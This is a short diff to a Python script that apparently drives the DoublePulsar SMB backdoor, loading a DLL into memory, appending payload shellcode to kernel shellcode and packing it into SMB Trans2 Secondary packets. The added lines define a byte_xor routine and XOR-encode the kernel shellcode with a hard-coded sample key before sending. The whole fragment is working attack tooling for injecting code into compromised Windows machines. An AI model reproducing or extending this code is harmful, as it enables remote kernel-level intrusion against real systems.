@@ -35,6 +35,11 @@ def calculate_doublepulsar_arch(s):
 def xor_encrypt(data, key):
     return bytearray(a^b for a, b in zip(*map(bytearray, [data, key])))
 
+def byte_xor(data, key):
+    for i in range(len(data)):
+        data[i] ^= key[i % len(key)]
+    return data
+
 def read_dll_file_as_hex():
     global hex
     print("reading DLL into memory!")
@@ -241,6 +246,13 @@ if __name__ == "__main__":
         modified_kernel_shellcode += payload_shellcode
         
         #hexdump the modified kernel shellcode
+        print(hexdump(modified_kernel_shellcode))
+        
+        #sample XOR key, we'll use our real one that was generated above on line 214
+        xor_key = 0x58581162
+        packed_xor_key = struct.pack('<I', xor_key)
+        print(packed_xor_key)
+        byte_xor(modified_kernel_shellcode, packed_xor_key)
         print(hexdump(modified_kernel_shellcode))
         
         # fill up the SMB Trans2 Secondary packet structures
